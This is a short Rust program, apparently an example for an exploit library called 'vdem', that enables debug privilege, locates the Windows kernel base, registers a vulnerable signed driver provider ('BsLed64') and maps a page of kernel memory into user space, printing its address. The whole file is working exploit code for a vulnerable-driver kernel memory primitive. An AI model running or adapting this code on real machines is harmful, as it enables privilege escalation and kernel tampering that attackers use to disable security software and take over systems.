use std::println;

use providers::bsled::BsLed64;
use vdem::{
    exploit::Exploit, nt::get_kernelbase, traits::MemoryMap,
    utils::promote_privilege_to_debug_level,
};

fn main() {
    promote_privilege_to_debug_level();

    let krnlbase = get_kernelbase().unwrap();

    let mut exploit = Exploit::instance().lock().unwrap();

    exploit.register_provider(Box::new(BsLed64::new()));

    exploit.select("BS_LED").unwrap();

    let mapbuf = exploit.mmap(krnlbase as _, 4096).unwrap();

    println!("kernel base is mapped at {:p}", mapbuf.as_ptr());
}
